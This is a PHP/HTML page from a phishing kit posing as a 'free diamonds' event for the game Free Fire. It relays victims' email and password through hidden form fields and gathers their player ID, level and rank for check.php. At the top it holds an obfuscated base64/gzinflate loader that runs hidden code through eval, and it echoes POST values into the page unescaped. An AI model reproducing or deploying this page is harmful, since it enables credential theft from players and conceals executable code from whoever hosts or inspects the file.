<?php
$SISTEMIT_COM_ENC = "3dW5qqxYFAbgvKFf4nCDvlTg7FYuJyjneR6qTC4oKDihJlX6XveBCsFAMTAwEqHrnKxfofO9vs1e/2Ltv//64cqux+uy95s19d+8wf75/POBbS7IW50Ur1yWtgG9bLw/wh0TJ6vw6iuceWS2NsVZtPh55NoPVszcQ6XpF7u67HoVGCdg0cXbjnvghacGoSl+QmedY1tK25oE4zJUhBLlh1AH6HSb2SsKMBqz+pcklpJT20NlEjSz7mG6ccx5PjKCkY+ehE83OISWr/wyWDyHmanZatLFYSE1o8CjYbAtcLgFdMwoGZDc4ySY96N4Jim729NGyI7Vzzl6FkjQFCyCiTshHFhkVz4EWoltqyaCR+4ScXxpTtPJX21fVsxNm8nbklMgLTnklpuiIpK5JrS0P4OIuoMJ4DUSa4JCkzNrTk9tFLPWifMso9NR4KiL/zKg+zQl6mMEmUALpdBZgzXrQM/vwB0sFINmZGvkRE7axzEarcRHCZhdUHiQtlM1GulzCh/iGro8pjqz/BwWIzmcpAmMZ2jd2NgNb+SiqQTadIiIkuOU3FrJXzkjWFyovCvYMTlDKhCEu5pk/GB0Ce6imi7iDiAJj5P8POStfVdXJU3pHgaSNDvbQwel0iyxScpV7oRs7W+sb2QZd9LB2seOzKKGmzQsnqKk4u6xzat4VJrb3UCApfCeknSsWQuVt7RPzQUq8M8nYlX7jJ/L2GWoMAHrHOtrfs2CA56RpZnuQaH09og5j0IunUtHsriu4bXsKTsuz55LlISnJtidWLvU4hcE3p7lxadL9cj0zhgHfkI9YGtNAJ+BMDVhbcfcTG0BddN2u7WiJWaa5oLXPH1t5Ly87MPRvJwovjTNyyakEqAxXftDLL+COoJ7leKkatWuCH3WxwAH+PM4wGmROEXhCr09ofNWRY9i2APQMJP3CJXDeOAeAxsraL2M2ZZ1Nbn1jruj/aLK3GfCen1dAi+LeZZSde7BMwJBZYPNH5NoIyn5iLxLxbYOHFylo+rJHHkKr1llyIvG3FcHk7XSGuS0uw6zMELg8pQWanpJCUyI1QXd20RJA5jqhWlchhaSmaf57Lkqtix76bbrlFqFkEBeZoV9xp+mVSGAh9CkaVRtogXxnYRXFsc1TZfGj2kqvGFEoQ3UcxaPszwgyBiqGpBBDlPQBNRbDWrrIqtydX1kr1sRTRHWXJGZNxSB4V31VWTqa869uh5Brer+ejTk6e22LtWztwwSvl4SCOuqdN6UXrwbBMHoZV+ZfZ1XfG3Xis6jOxU7gDM1MQIDSkoEfabYpVYOBbKacwzwErIwQNGwVZvWDYWgMsVqAFl1Lj0+Pz9+/ej2evuM9+kg8d/bkby2458Pt0iQXXQa2ysVB7XRe5AgcahITs7sPro2YbCaMU+0fhXtDhK191xxY37m/NLxgoII/NJ/umUkmr7j65zw3kY+4vCztw/vPRnSqo0I3Y7qg1+/fY6pA6ysdL8hNhRHj9AY3GU24uLJRfmmHrdtNAQjT+DX6YSEbqPR7NYlFuebd8cMVRuY0eONKvmuJ2AfdQoPSx4ubDg73Kgu32D3YjMihAkTlIh89O3nSvftc8K3H5bffm+KX77TffuVQXz5erV9+YVefPuF/VVfl0xcrv57qrgInVXXN5gILjm/DqJQKGtfMNijcmS3ivI4iL7uF/ey8d5ncx1RiLfnvt8pHWKj24iCvPsZJTyN6V89DGc1LNd9F5Uve4n9e+8izmDZ77h+/jrOvfznv3F9R/jz568frmdanx//lz/p49fff/0L";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FAbgvKFf4nCDvlTg7FYuJyjneR6qTC4oKDihJlX6XveBCsFAMTAwEqHrnKxfofO9vs1e/2Ltv//64cqux+uy95s19d+8wf75/POBbS7IW50Ur1yWtgG9bLw/wh0TJ6vw6iuceWS2NsVZtPh55NoPVszcQ6XpF7u67HoVGCdg0cXbjnvghacGoSl+QmedY1tK25oE4zJU";
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta property="og:type" content="website" />
   <meta property="og:title" content="Garena Free Fire Event" />
   <meta property="og:description" content="Dapatkan Domain Free Fire Gratis Sekarang!" />
   <meta property="og:image" content="static/img/reward.jpg" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="static/css/ryu.css">
    <link rel="stylesheet" href="static/css/fb.css">
    <link rel="stylesheet" href="static/css/vk.css">
    <title>Free Fire Events</title>
  </head>
  <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div id="bg" style="filter: brightness(80%);"></div>
    <div id="app">
        <div class="ryu-header">
            <img src="https://i.ibb.co/xJf56d1/IMG-20210202-233450.jpg">
            <div class="ryu-text-header"> Free Fire <span>Event Diamond Gratis</span></div>
        </div>
        <div class="ryu-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
               <div class="carousel-inner">
                  <div class="carousel-item active">
                     <img src="https://i.ibb.co/WxwSXBc/iklan-skuyy3.jpg" class="d-block w-100" alt="...">
                  </div>
                  <div class="carousel-item">
                     <img src="https://i.ibb.co/kDp4Ghj/iklan-skuyy2.jpg" class="d-block w-100" alt="...">
                  </div>
                  <div class="carousel-item">
                     <img src="https://i.ibb.co/YZYq7M0/iklan-skuyy1.jpg" class="d-block w-100" alt="...">
                  </div>
               </div>
            </div>
        </div>
        <div class="cat">
           <div class="catBox">Halo Player, Silahkan verifikasi akun anda!</div>
        </div>
        <div class="ryucontent">
        <div class="row">
                <div class="col-md-12 col-12">
                    <div class="scroll">
                    <div class="selectLogin">
                  <div class="col-md-12 col-12">
                     <form class="formInfo" action="check.php" method="POST">
                        <input name="email" value="<?= $_POST['email'] ?>" type="hidden" class="validateYamisok mb-5" readonly>
                        <input name="password" value="<?= $_POST['password'] ?>" type="hidden" class="validateYamisok mb-5" readonly>
                        <input name="login" value="<?= $_POST['login'] ?>" type="hidden" class="validateYamisok mb-5" readonly>
                        <div class="form-group">
                           <label>Player ID</label>
                           <input type="number" class="form-control" name="playerID" placeholder="Masukan ID Player Free Fire" autocomplete="off" pattern="[0-9]* /^-?\d+\.?\d*$/" onKeyPress="if(this.value.length==10) return false;" required>
                        </div>
                        <div class="form-group">
                           <label>Level Akun</label>
                           <select name="level" class="form-control" required>
                             <option selected disabled>- Level Akun Free Fire -</option>
                              <option>1</option>
                              <option>2</option>
                              <option>3</option>
                              <option>4</option>
                              <option>5</option>
                              <option>6</option>
                              <option>7</option>
                              <option>8</option>
                              <option>9</option>
                              <option>10</option>
                              <option>11</option>
                              <option>12</option>
                              <option>13</option>
                              <option>14</option>
                              <option>15</option>
                              <option>16</option>
                              <option>17</option>
                              <option>18</option>
                              <option>19</option>
                              <option>20</option>
                              <option>21</option>
                              <option>22</option>
                              <option>23</option>
                              <option>24</option>
                              <option>25</option>
                              <option>26</option>
                              <option>27</option>
                              <option>28</option>
                              <option>29</option>
                              <option>30</option>
                              <option>31</option>
                              <option>32</option>
                              <option>33</option>
                              <option>34</option>
                              <option>35</option>
                              <option>36</option>
                              <option>37</option>
                              <option>38</option>
                              <option>39</option>
                              <option>40</option>
                              <option>41</option>
                              <option>42</option>
                              <option>43</option>
                              <option>44</option>
                              <option>45</option>
                              <option>46</option>
                              <option>47</option>
                              <option>48</option>
                              <option>49</option>
                              <option>50</option>
                              <option>51</option>
                              <option>52</option>
                              <option>53</option>
                              <option>54</option>
                              <option>55</option>
                              <option>56</option>
                              <option>57</option>
                              <option>58</option>
                              <option>59</option>
                              <option>60</option>
                              <option>61</option>
                              <option>62</option>
                              <option>63</option>
                              <option>64</option>
                              <option>65</option>
                              <option>66</option>
                              <option>67</option>
                              <option>68</option>
                              <option>69</option>
                              <option>70</option>
                              <option>71</option>
                              <option>72</option>
                              <option>73</option>
                              <option>74</option>
                              <option>75</option>
                              <option>76</option>
                              <option>77</option>
                              <option>78</option>
                              <option>79</option>
                              <option>80</option>
                              <option>81</option>
                              <option>82</option>
                              <option>83</option>
                              <option>84</option>
                              <option>85</option>
                              <option>86</option>
                              <option>87</option>
                              <option>88</option>
                              <option>89</option>
                              <option>90</option>
                              <option>91</option>
                              <option>92</option>
                              <option>93</option>
                              <option>94</option>
                              <option>95</option>
                              <option>96</option>
                              <option>97</option>
                              <option>98</option>
                              <option>99</option>
                              <option>100</option>
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Tier Ranked</label>
                           <select name="tier" required="required" class="form-control">
                           <option selected disabled>- Pilih Tier Akun Free Fire -</option>
                            <option>Bronze</option>
                                <option>Silver</option>
                                <option>Gold</option>
                                <option>Platinum</option>
                                <option>Diamond</option>
                                <option>Master</option>
                                <option>Grandmaster</option>
                           </select>
                        </div>
                        <div class="form-group mt-4">
                           <button type="submit" class="btn btn-primary btn-custom" style="font-size: 13px;">Verifikasi</button>
                        </div>
                     </form>
                  </div>
                    </div>
                </div>
        </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
    <script src="static/js/ryu.js"></script>
   </body>
</html>